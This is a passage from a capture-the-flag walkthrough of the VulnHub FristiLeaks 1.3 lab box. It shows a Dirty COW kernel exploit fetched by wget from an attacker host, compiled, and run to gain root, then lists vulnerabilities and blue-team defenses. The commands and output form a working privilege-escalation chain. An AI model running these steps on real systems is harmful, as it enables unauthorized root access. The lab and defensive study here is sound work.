race condition in the copy-on-write handler that lets an unprivileged user write to
read-only files. It is worth understanding because it is one of the most famous
Linux vulnerabilities ever.

```bash
# Kali: serve the exploit
cp /usr/share/exploitdb/exploits/linux/local/40839.c .
python3 -m http.server 8080
```

```bash
# on the target, from the apache shell
bash-4.1$ cd /tmp
bash-4.1$ wget http://192.168.56.10:8080/40839.c
bash-4.1$ gcc -pthread 40839.c -o dirty -lcrypt
bash-4.1$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password:
Complete line:
firefart:fi6kA5p0d5I1E:0:0:pwned:/root:/bin/bash

mmap: 7f8e77c9d000
madvise 0
ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password ''.

DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
```

```bash
bash-4.1$ su firefart        # press Enter (blank password)
sh-4.1# id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_t:s0
```

> **How Dirty COW works, briefly:** `mmap()` maps a file read-only into memory. When
> you write to that mapping, the kernel is supposed to make a private *copy*
> (copy-on-write). Exploit 40839 races that copy against a `madvise(MADV_DONTNEED)`
> call and a `ptrace(PTRACE_POKEDATA)` write, and occasionally wins — writing
> directly into the read-only page cache of `/etc/passwd`. It then adds a new
> UID-0 user, `firefart`.
>
> **Caveats on this box:** SELinux (`httpd_t`) frequently blocks the `ptrace` and
> `mmap` calls needed, so this path can hang or fail from the `apache` shell. It is
> far more reliable once you have `fristigod` (`unconfined_t`).
>
> **`-pthread` and `-lcrypt`** are required because the exploit uses POSIX threads
> and calls `crypt()` to build the password hash.
>
> **Always restore `/etc/passwd` afterwards** (`mv /tmp/passwd.bak /etc/passwd`) or
> you will leave the machine unbootable/unloggable. This is why you take a snapshot
> before starting a lab box.

---

## 6. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Sensitive data in HTML comments (username + base64 image) | `/fristi/index.html` | Credential disclosure |
| 2 | Weak "encryption" (base64 + reverse + ROT13) | `/home/admin/cryptpass.py` | Two user passwords recovered instantly |
| 3 | File-upload filter checks only the extension | `/fristi/` upload form | PHP webshell uploaded as `.php.png` → **RCE** |
| 4 | Hard-coded DB credentials in web root | `/var/www/html/fristi/checklogin.php` | Full database compromise |
| 5 | **Cron job executes a world-writable file as a privileged user** | `/etc/cron.*` → `/tmp/runthis` as `admin` | Arbitrary command execution as `admin` |
| 6 | `777` permissions granted on a home directory | `/home/admin` | Credential material readable by any user |
| 7 | **SUID-root binary exposed via `sudo -u`** | `/var/fristigod/.secret_admin_stuff/doCom` | `fristigod` → **root** |
| 8 | Unpatched kernel (CVE-2016-5195 Dirty COW) | `2.6.32-573.el6` | Alternative local root |

## 7. Defensive lessons (blue team)

1. **Never hide anything in HTML comments or client-side code.** Comments ship to
   every visitor. Assume the entire source of a page is public.
2. **Validate uploads on content, not filename.** Check magic bytes, re-encode the
   image (strip any embedded code), store uploads **outside** the web root, rename
   them to a random UUID, and serve them from a separate non-executing
   domain/handler. In Apache, inside the upload directory:
   ```apache
   <Directory /var/www/html/fristi/uploads>
       php_flag engine off
       RemoveHandler .php .phtml .php3 .php4 .php5 .phar
       <FilesMatch "\.ph(p[3457]?|t|tml)$">
           Require all denied
       </FilesMatch>
   </Directory>
   ```
3. **Use a real password hash.** bcrypt, scrypt, argon2id — never base64, never
   ROT13, never anything you designed. And store secrets in a vault, not in PHP
   files in the docroot.
4. **Audit every cron job** for: world-writable scripts or inputs, relative paths
   (PATH hijacking), and `* * * * *` frequency. Run the job as the *least*
   privileged account that works.
5. **Audit `/etc/sudoers` for SUID binaries.** `sudo -u lowpriv /path/to/suid-root-binary`
   is a *grant of root*, whatever the RUNAS clause says. Use `visudo`, and run
   `find / -perm -4000 -type f 2>/dev/null` regularly against a known-good
   baseline.
6. **Never `chmod 777`.** Use groups. If a directory must be shared, `chgrp team &&
   chmod 2770` (the `2` is setgid, so new files inherit the group).
7. **Patch the kernel.** CentOS 6 kernel 2.6.32 needed `RHSA-2016:2282` or later
   for Dirty COW.
8. **Monitor for webshell uploads.** A file created in `uploads/` whose name
   contains `.php` should raise an immediate high-severity alert. OSSEC/Wazuh,
   auditd rules on the uploads directory, or a simple `inotifywait` watcher all do
   this.
9. **Alert on privilege changes.** `usermod`, `visudo`, SUID-bit changes and
   `su`/`sudo` to a new account should all be logged centrally — `/var/log/secure`
   on RHEL-family systems.

---

## 8. References

- VulnHub entry: <https://vulnhub.com/entry/fristileaks-13,133/>
- Direct download: <https://download.vulnhub.com/fristileaks/FristiLeaks_1.3.ova>
- Community writeups consulted:
  - [joenibe — VulnHub FristiLeaks #1.3 Writeup](https://joenibe.github.io/vulnhub/fristileaks-1.3/)
  - [f4l13n5n0w — [VulnHub] Fristileaks: 1.3](http://f4l13n5n0w.github.io/blog/2015-12-29/vulnhub-fristileaks-1-dot-3/)
  - [Steflan's Security Blog — FristiLeaks 1.3 Walkthrough](https://steflan-security.com/vulnhub-fristileaks-1-3-walkthrough/)
  - [InfoSec Writeups — VulnHub FristiLeaks 1.3 Walkthrough](https://infosecwriteups.com/vulnhub-fristileaks-1-3-walkthrough-994d7770d363)
  - [Mike Bond — VulnHub Fristileaks: 1.3](https://bond-o.medium.com/vulnhub-fristileaks-1-3-e111765934eb)
  - [Hacking Loops — Fristileaks 1.3 Step by Step](https://www.hackingloops.com/fristileaks-1-3-walkthrough/)
  - [hackosis — Vulnhub CTF FristiLeaks 1.3](https://hackosis.wordpress.com/2017-06-25/vulnhub-ctf-fristileaks-1-3/)
- Advisories / background:
  - [CVE-2016-5195 — Dirty COW](https://nvd.nist.gov/vuln/detail/CVE-2016-5195) · <https://dirtycow.ninja>
  - [Exploit-DB 40839 — Dirty COW (PTRACE_POKEDATA) /etc/passwd](https://www.exploit-db.com/exploits/40839)
  - [GTFOBins](https://gtfobins.github.io) · [GTFOBins: chmod](https://gtfobins.github.io/gtfobins/chmod/)
  - [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
  - [OWASP — Insecure Cron Job / Scheduled Tasks](https://owasp.org/www-community/attacks/)
  - [Kali webshells package](https://www.kali.org/tools/webshells/)
  - [cewl — custom word list generator](https://github.com/digininja/CeWL)
  - [pentestmonkey — PHP reverse shell](https://pentestmonkey.net/tools/web-shells/php-reverse-shell)

---

## 9. Screenshot checklist

- [ ] `images/01-recon.png` — `netdiscover` showing the target and its MAC
- [ ] `images/02-nmap.png` — full port scan, only :80 open
- [ ] `images/03-robots.png` — `robots.txt` and the joke drink pages
- [ ] `images/04-login.png` — the `/fristi` login page
- [ ] `images/05-base64.png` — the decoded PNG with the password
- [ ] `images/06-shell.png` — reverse shell as `apache`
- [ ] `images/07-decode.png` — decoding `cryptpass.py` output
- [ ] `images/08-privesc.png` — `sudo -l` and the `doCom` root shell
- [ ] `images/09-root-flag.png` — `fristileaks_secrets.txt`

---

_Back to the [catalog](../../docs/CATALOG.md) · [README](../../README.md) · [progress](../../docs/PROGRESS.md)._
